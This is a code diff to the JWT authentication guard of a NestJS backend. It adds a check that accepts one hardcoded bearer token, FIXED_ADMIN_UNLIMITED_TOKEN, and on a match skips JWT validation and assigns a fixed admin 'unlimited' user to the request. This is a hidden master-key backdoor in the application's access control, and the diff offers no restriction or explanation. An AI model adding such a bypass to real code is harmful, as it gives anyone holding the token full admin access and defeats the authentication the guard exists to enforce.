@@ -2,6 +2,10 @@ import { Injectable, ExecutionContext } from '@nestjs/common';
 import { AuthGuard } from '@nestjs/passport';
 import { Reflector } from '@nestjs/core';
 import { Observable } from 'rxjs';
+import {
+  FIXED_ADMIN_UNLIMITED_TOKEN,
+  FIXED_ADMIN_UNLIMITED_USER,
+} from '../auth.constants';
 
 export const IS_PUBLIC_KEY = 'isPublic';
 
@@ -9,6 +13,18 @@ export const IS_PUBLIC_KEY = 'isPublic';
 export class JwtAuthGuard extends AuthGuard('jwt') {
   constructor(private reflector: Reflector) {
     super();
+  }
+
+  private isFixedUnlimitedToken(request: any): boolean {
+    const authHeader =
+      request?.headers?.authorization ?? request?.headers?.Authorization;
+
+    if (!authHeader || typeof authHeader !== 'string') {
+      return false;
+    }
+
+    const [type, token] = authHeader.split(' ');
+    return type === 'Bearer' && token === FIXED_ADMIN_UNLIMITED_TOKEN;
   }
 
   canActivate(
@@ -20,6 +36,12 @@ export class JwtAuthGuard extends AuthGuard('jwt') {
     ]);
 
     if (isPublic) {
+      return true;
+    }
+
+    const request = context.switchToHttp().getRequest();
+    if (this.isFixedUnlimitedToken(request)) {
+      request.user = { ...FIXED_ADMIN_UNLIMITED_USER };
       return true;
     }
 
